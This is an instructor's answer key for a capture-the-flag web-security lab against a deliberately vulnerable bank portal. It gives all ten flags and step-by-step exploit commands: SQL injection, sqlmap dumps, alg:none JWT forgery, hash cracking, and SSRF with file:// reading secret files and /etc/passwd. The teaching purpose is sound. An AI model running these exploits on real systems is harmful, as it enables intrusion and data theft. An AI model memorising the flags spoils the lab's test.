# INSTRUCTOR GUIDE — Lab 9: Operation VAULT BREACH
## ⚠ PRIVATE — DO NOT DISTRIBUTE TO STUDENTS ⚠

---

## Overview

This document contains every flag, the exact exploitation chain for each, validation commands, grading rubrics, and setup notes. Keep it private.

---

## Application Architecture (what students don't know)

```
NorthStar Bank Portal
  └── server.js             (Express, port 80 — public)
  └── internal-service.js   (Express, port 8888 — localhost only, SSRF target)
  └── .env                  (served as static file — Flag 1)
  └── backup.sql            (served as static file — MD5 hashes)
  └── secret/master_key.txt (SSRF file:// target — Flag 10)
  └── database/northstar.db (SQLite)
  └── public/
      ├── admin/index.html  (admin panel — default creds — Flag 2)
      └── documents/internal/q4_memo_CONFIDENTIAL.html (forced browsing — Flag 6)
```

**Intentional vulnerabilities:**
- `express.static(__dirname)` exposes app root (not just `public/`)
- `robots.txt` lists `/.env` and `/backup.sql`
- Login query uses string interpolation (SQLi)
- `jwt.verify()` without `algorithms` option (accepts `alg:none`)
- `/api/statement` has no ownership check (IDOR)
- `/api/transfer/notify` fetches `callback_url` server-side (SSRF)
- `node-fetch` v2 supports `file://` protocol

---

## Flag Reference

| # | Flag | Points | Location |
|---|---|---|---|
| 1 | `FLAG{c0nf1g_l34k5_y0ur_s3cr3ts_n0rthst4r}` | 50  | `/.env` file |
| 2 | `FLAG{d3f4ult_cr3d5_4r3_4_f1n4nc14l_cr1m3}` | 75  | `/admin` panel login |
| 3 | `FLAG{sql_1nj3ct10n_0p3n5_th3_v4ult_d00r}`  | 100 | POST `/api/auth/login` response |
| 4 | `FLAG{un10n_b4s3d_3xtr4ct10n_h1ts_p4yd1rt}` | 150 | `vault_secrets` table via UNION SQLi |
| 5 | `FLAG{1d0r_expos3d_th3_cf0_4cc0unt_d4t4}`   | 200 | `GET /api/statement?account_id=7` |
| 6 | `FLAG{f0rc3d_br0ws1ng_f0und_th3_b00ks}`     | 250 | `/documents/internal/q4_memo_CONFIDENTIAL.html` |
| 7 | `FLAG{r0cky0u_cr4ck3d_th3_cf0_p4ssw0rd}`   | 300 | CFO dashboard after cracking `sunshine` |
| 8 | `FLAG{jwt_4lg0r1thm_c0nfus10n_pr1v_3sc}`    | 400 | `GET /api/admin/users` with forged token |
| 9 | `FLAG{ssrf_t4pp3d_th3_1nt3rn4l_n3tw0rk}`   | 500 | POST `/api/transfer/notify` → `http://localhost:8888/internal/config` |
| 10| `FLAG{ssrf_f1l3_syst3m_1s_4n_0p3n_b00k}`   | 600 | POST `/api/transfer/notify` → `file:///var/www/app/secret/master_key.txt` |

---

## Exploitation Walkthroughs

---

### FLAG 1 — Exposed `.env` File (50 pts)
**Vulnerability:** A05 — Security Misconfiguration
**CVSS:** 5.3 Medium

**How it works:**
`express.static(__dirname)` serves the app root. `/robots.txt` disallows `/.env`, which is a breadcrumb pointing directly at it.

**Exploitation:**
```bash
# Discover via robots.txt
curl http://192.168.56.30/robots.txt

# Retrieve the .env
curl http://192.168.56.30/.env
```

**Expected output:**
```
JWT_SECRET=secret123
# Internal API flag: FLAG{c0nf1g_l34k5_y0ur_s3cr3ts_n0rthst4r}
```

**Grading:** Full credit for the flag + explaining the exposure mechanism.

---

### FLAG 2 — Default Admin Credentials (75 pts)
**Vulnerability:** A05 — Security Misconfiguration
**CVSS:** 7.5 High

**How it works:**
`/robots.txt` disallows `/admin/`. Navigating to `http://192.168.56.30/admin/` shows a login form. Default credentials `admin:admin123` authenticate and reveal Flag 2.

**Exploitation:**
```bash
# Discover admin panel
curl -s http://192.168.56.30/robots.txt | grep admin

# Authenticate via API
curl -s -X POST http://192.168.56.30/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Or visit in browser: http://192.168.56.30/admin/
```

**Expected response:**
```json
{
  "authenticated": true,
  "flag": "FLAG{d3f4ult_cr3d5_4r3_4_f1n4nc14l_cr1m3}",
  "message": "Welcome, Administrator."
}
```

**Note:** The admin panel HTML (`/admin/index.html`) also has a "Load Users" button that requires a valid JWT with admin/cfo role — that is the path to Flag 8, not Flag 2.

---

### FLAG 3 — SQL Injection Login Bypass (100 pts)
**Vulnerability:** A04 — Injection
**CVSS:** 9.1 Critical

**How it works:**
`POST /api/auth/login` interpolates `username` directly into a raw SQL query. A classic `' OR '1'='1' --` payload bypasses authentication. When injection is detected, the server embeds `FLAG{...}` in the `security_notice` field of the response.

**Exploitation:**
```bash
curl -s -X POST http://192.168.56.30/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}'

# Cleaner with single quotes escaped:
curl -s -X POST http://192.168.56.30/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"x'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- -","password":"x"}'
```

**Payload (raw):** `username = ' OR '1'='1' --`

**Expected response excerpt:**
```json
{
  "token": "eyJ...",
  "user": { "id": 1, "username": "john.doe", ... },
  "security_notice": "FLAG{sql_1nj3ct10n_0p3n5_th3_v4ult_d00r}",
  "_debug": { "executed_query": "SELECT ... WHERE username = '' OR '1'='1' --'" }
}
```

**sqlmap alternative:**
```bash
sqlmap -u "http://192.168.56.30/api/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch --level=1 --risk=1
```

---

### FLAG 4 — UNION-Based SQL Injection (150 pts)
**Vulnerability:** A04 — Injection (chained with A01 auth bypass)
**CVSS:** 9.8 Critical

**How it works:**
Once authenticated (via SQLi bypass or any valid credentials), `GET /api/statement?account_id=` is injectable. A UNION SELECT against the hidden `vault_secrets` table returns Flag 4.

**Column count:** The transactions query returns 9 columns. UNION payload must provide 9 values.

**Exploitation:**
```bash
TOKEN=$(curl -s -X POST http://192.168.56.30/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john.doe","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# UNION injection to extract vault_secrets
curl -s -G http://192.168.56.30/api/statement \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "account_id=0 UNION SELECT id,secret_name,flag,4,5,6,7,8,9 FROM vault_secrets--"
```

**Expected response excerpt:**
```json
{
  "transactions": [
    { "id": 1, "date": "q4_master_passphrase", "description": "FLAG{un10n_b4s3d_3xtr4ct10n_h1ts_p4yd1rt}", ... }
  ]
}
```

**sqlmap automated:**
```bash
sqlmap -u "http://192.168.56.30/api/statement?account_id=1" \
  -H "Authorization: Bearer $TOKEN" \
  --tables --batch

sqlmap -u "http://192.168.56.30/api/statement?account_id=1" \
  -H "Authorization: Bearer $TOKEN" \
  -T vault_secrets --dump --batch
```

---

### FLAG 5 — IDOR on Account Statements (200 pts)
**Vulnerability:** A01 — Broken Access Control
**CVSS:** 7.5 High

**How it works:**
`GET /api/statement?account_id=N` returns any account's data without checking that the requesting user owns that account. Account ID 7 (CFO savings) has a transaction with Flag 5 in the `notes` field.

**Exploitation:**
```bash
# Student is logged in as john.doe (accounts 1-2)
# Iterate to find other accounts
for i in $(seq 1 10); do
  echo -n "account_id=$i: "
  curl -s -G http://192.168.56.30/api/statement \
    -H "Authorization: Bearer $TOKEN" \
    --data-urlencode "account_id=$i" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(t.get('notes','')) for t in d.get('transactions',[]) if t.get('notes')]" 2>/dev/null
done

# Direct hit
curl -s -G http://192.168.56.30/api/statement \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "account_id=7"
```

**Expected:** transaction notes field contains `FLAG{1d0r_expos3d_th3_cf0_4cc0unt_d4t4}`

---

### FLAG 6 — Forced Browsing to Internal Document (250 pts)
**Vulnerability:** A01 — Broken Access Control
**CVSS:** 6.5 Medium

**How it works:**
`robots.txt` disallows `/documents/`. Directory enumeration with `ffuf` or `gobuster` against `http://192.168.56.30/documents/` reveals the internal subdirectory. The confidential memo is at `/documents/internal/q4_memo_CONFIDENTIAL.html`.

**Exploitation:**
```bash
# Step 1: spot the robots.txt hint
curl http://192.168.56.30/robots.txt

# Step 2: enumerate /documents/
ffuf -u http://192.168.56.30/documents/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -recursion -recursion-depth 2 -mc 200

# Step 3: direct access
curl http://192.168.56.30/documents/internal/q4_memo_CONFIDENTIAL.html | grep FLAG
```

**Flag location in doc:** In the "Internal Reference" section — `Audit Trail:` field.

---

### FLAG 7 — MD5 Hash Cracking → CFO Login (300 pts)
**Vulnerability:** A02 — Cryptographic Failures
**CVSS:** 8.1 High

**Chain:** `backup.sql` → extract MD5 hash → crack with `john`/`hashcat` → log in as CFO → dashboard shows flag.

**Exploitation:**
```bash
# Step 1: retrieve backup.sql (hinted in robots.txt)
curl http://192.168.56.30/backup.sql | grep cfo

# MD5 for cfo.harris: 0571749e2ac330a7455809c6b0e7af90

# Step 2: crack with john
echo "0571749e2ac330a7455809c6b0e7af90" > /tmp/cfo.hash
john /tmp/cfo.hash --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/cfo.hash --format=raw-md5 --show
# Result: sunshine

# Step 3: log in as CFO
curl -s -X POST http://192.168.56.30/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cfo.harris","password":"sunshine"}'

# Step 4: flag appears in dashboard banner (role=cfo)
# Visit http://192.168.56.30/dashboard.html after saving the token in localStorage
# OR check the token payload: role=cfo → dashboard JS shows the flag
```

**Flag:** `FLAG{r0cky0u_cr4ck3d_th3_cf0_p4ssw0rd}` — rendered in the "Privileged Account Notice" banner in `dashboard.html` when `user.role === 'cfo'`.

**hashcat alternative:**
```bash
hashcat -m 0 /tmp/cfo.hash /usr/share/wordlists/rockyou.txt
```

---

### FLAG 8 — JWT Algorithm Confusion / Weak Secret (400 pts)
**Vulnerability:** A02 — Cryptographic Failures
**CVSS:** 9.1 Critical

**Two attack paths:**

**Path A — alg:none (no secret needed):**
```bash
# Step 1: get any valid JWT (from login or SQLi bypass)
TOKEN="eyJ..."

# Step 2: decode header and payload
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null

# Step 3: craft alg:none token using jwt_tool
jwt_tool $TOKEN -X a
# OR manually:
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"id":4,"username":"admin","role":"admin","name":"System Administrator"}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}."

curl -s http://192.168.56.30/api/admin/users \
  -H "Authorization: Bearer $FORGED"
```

**Path B — forge with known secret (from .env):**
```bash
# JWT_SECRET = secret123 (from /.env — Flag 1)
jwt_tool $TOKEN -T  # tamper mode
# Set role to 'admin', re-sign with secret123

# Python alternative:
python3 -c "
import jwt, json
payload = {'id':4,'username':'admin','role':'admin','name':'System Administrator','iat':9999999999,'exp':9999999999}
token = jwt.encode(payload, 'secret123', algorithm='HS256')
print(token)"

curl -s http://192.168.56.30/api/admin/users \
  -H "Authorization: Bearer <forged_token>"
```

**Expected response:**
```json
{
  "users": [...],
  "system_flag": "FLAG{jwt_4lg0r1thm_c0nfus10n_pr1v_3sc}"
}
```

**Note:** `role: 'cfo'` (from cracking Flag 7) also reaches `requirePrivileged` but does NOT return `system_flag` — only `role: 'admin'` does. Students need the forged admin token specifically.

---

### FLAG 9 — SSRF to Internal Service (500 pts)
**Vulnerability:** A10 — SSRF
**CVSS:** 8.6 High

**How it works:**
`POST /api/transfer/notify` fetches `callback_url` server-side using `node-fetch` with no allowlist validation. The internal service at `localhost:8888` is not reachable from the attacker directly (UFW + loopback binding) but is reachable via SSRF.

**Exploitation:**
```bash
# Must be authenticated
curl -s -X POST http://192.168.56.30/api/transfer/notify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "to_account": "NS-100-553-8801",
    "amount": "1.00",
    "callback_url": "http://localhost:8888/internal/config"
  }'
```

**Expected response:**
```json
{
  "transfer_id": "TXN...",
  "notification": {
    "status": "delivered",
    "response": "{...\"_internal_flag\":\"FLAG{ssrf_t4pp3d_th3_1nt3rn4l_n3tw0rk}\"...}"
  }
}
```

**Discovery chain:** Understanding the `callback_url` parameter requires reading `transfer.html` source, noting the "Webhook Notification URL" field, and recognizing it as an SSRF sink. Students should enumerate other internal ports too (`/internal/metrics`, `/internal/health`).

---

### FLAG 10 — SSRF + File Protocol (600 pts)
**Vulnerability:** A10 — SSRF (chained with file:// protocol support)
**CVSS:** 9.6 Critical

**How it works:**
`node-fetch` v2 supports `file://` URIs. The application does not validate the URL scheme, allowing attackers to read local files by supplying `file:///path/to/file` as the callback URL.

**Exploitation:**
```bash
# Read the master key file
curl -s -X POST http://192.168.56.30/api/transfer/notify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "to_account": "NS-100-553-8801",
    "amount": "1.00",
    "callback_url": "file:///var/www/app/secret/master_key.txt"
  }'

# Read /etc/passwd (demonstrates full LFI via SSRF)
curl -s -X POST http://192.168.56.30/api/transfer/notify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "to_account": "NS-100-553-8801",
    "amount": "1.00",
    "callback_url": "file:///etc/passwd"
  }'
```

**Expected response contains:**
```
Archive flag: FLAG{ssrf_f1l3_syst3m_1s_4n_0p3n_b00k}
```

---

## Database Quick Reference

**MD5 hashes:**
| User | Password | MD5 |
|---|---|---|
| john.doe | password123 | `482c811da5d5b4bc6d497ffa98491e38` |
| jane.smith | qwerty | `d8578edf8458ce06fbc5bb76a58c5ca4` |
| cfo.harris | sunshine | `0571749e2ac330a7455809c6b0e7af90` |
| admin | admin123 | `0192023a7bbd73250516f069df18b500` |

**Account IDs and ownership:**
| ID | User | Type | Flag? |
|---|---|---|---|
| 1 | john.doe | checking | — |
| 2 | john.doe | savings | — |
| 3 | jane.smith | checking | — |
| 4 | jane.smith | savings | — |
| 5 | cfo.harris | checking | — |
| 6 | cfo.harris | money_market | — |
| 7 | cfo.harris | savings | **Flag 5 in notes** |
| 8 | admin | admin_reserve | — |

---

## Grading Rubric

| Component | Weight |
|---|---|
| Flags captured (points total) | 50% |
| Quality of exploitation evidence | 20% |
| Attack narrative / vulnerability explanation | 20% |
| Risk ranking justification | 10% |

**Expected flag capture by skill level:**
- Average student: Flags 1–6 (825 pts)
- Above average: Flags 1–8 (1,275 pts)
- Exceptional: All 10 flags (2,625 pts)

---

## Setup Validation Checklist

After `vagrant up`, verify from the attacker VM:

```bash
# Main app
curl -s http://192.168.56.30/ | grep -i northstar

# robots.txt
curl -s http://192.168.56.30/robots.txt

# .env exposure
curl -s http://192.168.56.30/.env | grep FLAG

# backup.sql exposure
curl -s http://192.168.56.30/backup.sql | grep cfo

# Admin panel
curl -s http://192.168.56.30/admin/index.html | grep -i admin

# Internal service NOT accessible directly from attacker
curl -s --max-time 3 http://192.168.56.30:8888/internal/config || echo "Correctly blocked"

# Internal service accessible via SSRF
TOKEN=$(curl -s -X POST http://192.168.56.30/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john.doe","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -X POST http://192.168.56.30/api/transfer/notify \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to_account":"test","amount":"1","callback_url":"http://localhost:8888/internal/config"}' \
  | grep -i flag
```

---

## Common Student Mistakes

1. **Flags 3/4 together:** Some students find Flag 4 before Flag 3 because they jump straight to UNION injection after login bypass. Both are valid paths — credit both.

2. **Flag 7 vs Flag 8 confusion:** Cracking `cfo.harris` gives role=cfo. The CFO token satisfies `requirePrivileged` but NOT the `role === 'admin'` check for `system_flag`. Students must forge an admin token for Flag 8 — remind them to re-read the `.env` for the JWT secret.

3. **SSRF not triggering:** If students get `"status":"failed"` on Flag 9, check that `northstar-internal.service` is running: `vagrant ssh northstar -c "systemctl status northstar-internal"`.

4. **file:// SSRF path:** The path is `/var/www/app/secret/master_key.txt` (where the app is deployed). Students who try `/vagrant/app/secret/master_key.txt` or other paths won't find it — give a hint if needed.
